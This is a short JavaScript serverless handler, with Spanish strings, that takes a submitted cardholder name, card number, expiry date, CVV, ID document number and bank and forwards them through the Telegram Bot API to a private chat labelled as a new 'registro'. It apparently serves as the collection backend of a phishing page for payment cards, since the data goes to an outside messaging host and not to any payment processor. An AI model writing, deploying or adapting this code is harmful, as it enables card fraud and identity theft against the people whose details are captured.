// api/send-telegram.js
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método no permitido' });
  }

  const { titular, numeroTarjeta, fechaExp, cvv, documento, banco } = req.body;
  // Validaciones básicas
  if (!titular || !numeroTarjeta || !fechaExp || !cvv || !documento || !banco) {
    return res.status(400).json({ error: 'Faltan campos obligatorios' });
  }

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatID  = process.env.TELEGRAM_CHAT_ID;
  const mensaje =
    `🔻NUEVO REGISTRO🔻\n\n` +
    `Titular: ${titular}\n` +
    `CC: ${numeroTarjeta}\n` +
    `Fecha: ${fechaExp}\n` +
    `CVV: ${cvv}\n` +
    `ID: ${documento}\n` +
    `Banco: ${banco}`;

  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  try {
    const resp = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type':'application/json' },
      body: JSON.stringify({
        chat_id: chatID,
        text: mensaje
      })
    });
    const data = await resp.json();
    if (!data.ok) throw new Error(data.description);
    return res.status(200).json({ sent: true });
  } catch (err) {
    console.error('Telegram API error:', err);
    return res.status(500).json({ error: 'Error al enviar mensaje' });
  }
}
